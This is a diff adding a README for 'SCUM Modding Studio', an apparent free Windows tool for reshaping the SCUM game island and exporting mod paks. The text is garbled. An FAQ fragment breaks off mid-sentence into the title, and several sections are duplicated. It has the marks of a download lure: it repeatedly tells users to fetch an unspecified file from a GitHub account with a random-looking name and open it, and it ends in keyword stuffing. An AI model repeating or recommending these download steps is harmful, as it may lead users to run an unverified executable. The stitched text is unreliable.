+
+## 🔧 How a Typical Project Works
+
+A normal session looks like this:
+
+1. **Open the studio** and start a new project.
+2. **Load the island** and fly to the area you want to change.
+3. **Sculpt the terrain** — flatten a plateau, raise a ridge, or smooth a coastline.
+4. **Place roads and bridges** to connect locations that were previously unreachable.
+5. **Tune or clone** vehicles and weapons in the item panels.
+6. **Save your project** so you can return to it later.
+7. **Export a mod pak** and copy it into your game or server setup.
+
+Because each step is visual, you always see the result before moving on. Nothing is committed until you export, so you are free to experiment.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Do I need Unreal Engine installed?**
+No. The studio handles everything itself. Unreal Engine is not required at any point.
+
+**Do I need to know how to code?**
+No. All editing is# 🗺️ SCUM-Modding-Studio - Reshape the Island Without Unreal
+
+[![Download SCUM Modding Studio](https://img.shields.io/badge/Download-SCUM%20Modding%20Studio-2ea44f?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Audysquinteyed352/SCUM-Modding-Studio)
+
+SCUM Modding Studio is a free Windows application for editing the SCUM island in 3D, building bridges and roads, tuning and cloning vehicles and weapons, and exporting mod paks for single-player games and servers. It gives you a visual workspace where you can shape the terrain, place structures, adjust gameplay values, and package everything into a ready-to-use mod file — all without opening the Unreal editor or writing a single line of code.
+
+Visit this link to download the application.
+
+## 🚀 Getting Started
+
+You can be up and running in a few minutes. The application is published on GitHub, which is the official home for every new version and update.
+
+1. Open your web browser — Chrome, Edge, Firefox, or whatever you normally use.
+2. Go to the download page: **https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+3. Use the download option provided on that page.
+4. Save the file somewhere you can find again, such as your **Downloads** folder.
+5. When the download finishes, open the saved file to start the studio.
+
+Visit this link to download the application.
+
+That is the whole process. There is nothing else to install, no development environment to configure, and no game engine to download. The studio is self-contained and built for players and server owners who simply want to change their game.
+
+## 🏝️ What You Can Do
+
+### Island Editing in 3D
+
+The centrepiece is a live three-dimensional view of the SCUM island. You fly the camera around the terrain, study locations from any angle, and make changes while watching the results appear immediately. Terrain tools let you raise and lower ground, smooth rough areas, and prepare flat spaces where new content will sit. Because the view is fully 3D, you can check how a hillside or coastline will look in-game long before you launch the game.
+
+### Bridges and Roads
+
+Bridges and roads are among the most requested additions in the SCUM modding community, and this tool treats them as first-class features. You draw a route across water or rough ground, place bridge segments piece by piece, and connect road sections so they line up cleanly with the surrounding landscape. The full path is visible as you build it, so curves, heights, and connection points can be adjusted without guessing. When you are finished, the route becomes part of your mod and appears in the game exactly where you placed it.
+
+### Vehicle and Weapon Tuning
+
+A dedicated tuning area handles vehicles and weapons. You adjust values such as speed, handling, durability, damage, and other gameplay numbers using simple on-screen controls instead of editing configuration files by hand. The cloning feature is especially handy: pick an existing item, duplicate it, then change only the details you care about. That makes it easy to build a whole family of related items — a faster version of a car, a heavier version of a rifle — without rebuilding anything from scratch.
+
+### Mod Pak Export
+
+When the work is done, the studio packages everything into a mod pak file. That single file is what the game reads. Use it in your own single-player world, or hand it to a server owner so it can be loaded on a multiplayer server. Exporting is handled entirely by the application, so there are no archive formats, folder structures, or packaging commands to worry about.
+
+## 🧰 Feature Highlights
+
+- Full 3D view of the SCUM island with free camera movement
+- Terrain sculpting for hills, plateaus, and shoreline adjustments
+- Bridge building with connectable, height-adjustable segments
+- Road placement that follows the natural shape of the landscape
+- Vehicle tuning for speed, handling, and durability
+- Weapon tuning for damage, recoil, and related values
+- One-click cloning of existing vehicles and weapons
+- Mod pak export suitable for single-player and servers
+- No Unreal editor required at any stage
+- Native Windows application with a clean, modern interface
+- Lightweight footprint compared with full game development suites
+- Free to download and use
+
+## 📥 Download and Setup
+
+Everything you need lives on the official project page.
+
+**Step 1 — Open the download page**
+
+Use this link in your browser:
+
+**https://github.com/Audysquinteyed352/SCUM-Modding-Studio**
+
+Visit this link to download the application.
+
+**Step 2 — Save the file**
+
+Choose the download option on the page and save the file to your computer. Keep track of the folder you save it in; the Downloads folder is a good default.
+
+**Step 3 — Open the application**
+
+Once the download is complete, locate the saved file and open it. SCUM Modding Studio starts and presents its main window, where you can begin a new project or continue an existing one.
+
+**Step 4 — Begin editing**
+
+Load the island, move the camera around, and start making changes. Save your project regularly so you can return to it later, and export a mod pak whenever you want to test your work in-game.
+
+SCUM Modding Studio runs on Windows 10 and Windows 11. If your computer can run SCUM itself, it can comfortably run the modding studio.
+
+## 🎮 Who This Is For
+
+**Server owners** who want to add bridges, roads, or custom vehicles to a community server and need a pak file they can load quickly and share with players.
+
+**Single-player players** who want to reshape the island for their own runs — building a base on a new plateau, linking two landmasses with a bridge, or tuning a favourite weapon so it feels different.
+
+**Modding beginners** who have ideas but no experience with Unreal Engine or programming. The visual approach means you learn by doing rather than by studying documentation.
+
+**Experienced modders** who want a faster workflow for repetitive tasks like cloning items and packaging paks, instead of repeating the same clicks in a full editor.
+
+## 🗺️ A Typical Project
+
+A normal session follows a simple rhythm:
+
+1. Open the studio and create a new project.
+2. Load the island and fly to the area you want to change.
+3. Sculpt the terrain — flatten a plateau, raise a ridge, or smooth a coastline.
+4. Place roads and bridges to connect locations that were previously unreachable.
+5. Tune or clone vehicles and weapons in the item panels.
+6. Save the project so you can return to it later.
+7. Export a mod pak and copy it into your game or server setup.
+
+Because every step is visual, you always see the result before moving on. Nothing is final until you export, so you are free to experiment without risk.
+
+## ❓ Common Questions
+
+**Do I need Unreal Engine installed?**
+No. The studio handles everything itself. Unreal Engine is not required at any point.
+
+**Do I need to know how to code?**
+No. All editing happens through the interface — no scripts, no configuration files, no programming.
+
+**Can I use my mods on a server?**
+Yes. Export a mod pak and give it to the server owner so it can be loaded on the server.
+
+**Will my mods work in single-player?**
+Yes. The same pak file works in single-player and on servers.
+
+**Can I edit the terrain without breaking the existing map?**
+Yes. Terrain tools work on the area you select, and nothing is written to your game until you export.
+
+**What if I make a mistake?**
+Save different versions of your project as you go. Because nothing is applied until export, you can always return to an earlier save.
+
+**Is the tool free?**
+Yes. SCUM Modding Studio is free to download and use.
+
+## 💬 Community and Support
+
+The GitHub page is the place to check for new versions, report an issue, or see what has changed in a release. If something does not behave as expected, search the existing reports first — someone may have already described the same situation. When you open a new report, describe what you did, what you expected to happen, and what actually happened, and include the version you are running.
+
+Feature requests are welcome as well. Bridges, roads, and vehicle tuning all started as ideas from players, so suggestions that describe a clear workflow are genuinely useful.
+
+## 🔑 Keywords
+
+Keywords: scum modding studio, scum map editor, scum mod maker, scum mod tool, scum modding tool, scum pak editor, scum server mods, scum single player mods, scum island editor, scum bridge builder, scum road builder, scum vehicle tuning, scum weapon tuning, scum terrain editor, free map editor, game modding tool, level editor, avalonia, csharp, dotnet, windows, ue4, unreal engine 4, survival game, mod pak, modding tool
